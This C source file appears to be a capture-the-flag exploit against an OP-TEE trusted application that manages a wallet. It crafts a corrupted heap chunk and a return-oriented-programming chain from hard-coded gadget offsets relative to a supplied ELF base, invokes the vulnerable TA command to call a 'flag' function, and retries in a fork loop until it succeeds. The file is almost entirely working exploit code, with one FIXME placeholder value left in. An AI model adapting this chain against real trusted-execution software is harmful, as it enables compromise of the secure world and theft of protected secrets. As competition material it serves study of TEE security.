#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "payload.h"

int exploit(uint32_t base)
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = { 0x7dc089d2, 0x883b, 0x4f7b, 
        { 0x81, 0x54, 0xea, 0x1d, 0xb9, 0xf1, 0xe7, 0xc3} };
    uint32_t err_origin;

    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);
    }

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_OUTPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);

    res = TEEC_InvokeCommand(&sess, 0, &op, &err_origin);
    if (res != TEEC_SUCCESS) {
        errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res, err_origin);
    }
    uint32_t wallet_id = op.params[0].value.a;

    if (base == 0) {
        printf("elf base: ");
        scanf("%x", &base);
    }
    const uint32_t malloc_ctx = base + 0x2A408;
    const uint32_t param = 0x00202000;
    const uint32_t pop_r0_r1_r2_r4_r5_pc = base + 0x2577f;
    const uint32_t pop_r7_pc = base + 0x2775;
    const uint32_t tee_memmove = base + 0x46E1;
    const uint32_t flag_func = base + 0x8F24;
    uint32_t sp = 0x00115c80;
    uint32_t *chunk = (uint32_t *)memmem(&payload, sizeof(payload), "MAGIC", 5);
    uint32_t offset = (uintptr_t)chunk - (uintptr_t)&payload;
    chunk[0] = 0;
    chunk[1] = 0x10;
    chunk[2] = sp - 0xc;
    chunk[3] = param + 0x1008;

    chunk = (uint32_t *)&payload[0x1000];
    memset(chunk, 0xee, 0x200);

    chunk[3] = pop_r0_r1_r2_r4_r5_pc;
    chunk[4] = 0x115000;
    chunk[5] = 0x400;
    chunk[9] = flag_func + 4;
    chunk[13] = pop_r0_r1_r2_r4_r5_pc;
    chunk[14] = 0x203060; // &chunk[22]
    chunk[15] = 0x115f24;
    chunk[16] = 0x4;
    chunk[19] = tee_memmove + 4;
    chunk[21] = pop_r0_r1_r2_r4_r5_pc;
    chunk[22] = 0xdeadbeef; // FIXME
    chunk[23] = 0x115000;
    chunk[24] = 0x400;
    chunk[27] = tee_memmove + 4;
    chunk[29] = pop_r0_r1_r2_r4_r5_pc;
    chunk[30] = 0;
    chunk[31] = 0;
    chunk[35] = pop_r7_pc;
    chunk[36] = 0x115ee0;
    chunk[37] = base + 0x27e1;

    uint8_t result[0x1000] = {0};
    memset(&result, 'X', sizeof(result));
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_VALUE_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT);
    op.params[0].value.a = wallet_id;
    op.params[1].value.a = 0;
    op.params[2].tmpref.buffer = (void *)&payload;
    op.params[2].tmpref.size = sizeof(payload);
    op.params[3].tmpref.buffer = &result;
    op.params[3].tmpref.size = sizeof(result);

    res = TEEC_InvokeCommand(&sess, 3, &op, &err_origin);

    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);

    int size = op.params[3].tmpref.size;
    if (res == 0xffff3024 || size == 0) {
        return -1;
    }
    printf("res %#x size %#x\n", res, size);
    write(1, &result[0], size);
    return 0;
}

int main(int argc, char *argv[])
{
    uint32_t base = argc > 1 ? strtoul(argv[1], NULL, 16) : 0;

    for (int i = 0; ; i++) {
        int res = 0;
        int pid = fork();
        if (!pid) {
            exit(exploit(base));
        }
        waitpid(pid, &res, 0);
        printf("%d %#x\n", i, res);
        if (res == 0) {
            break;
        }
    }
}
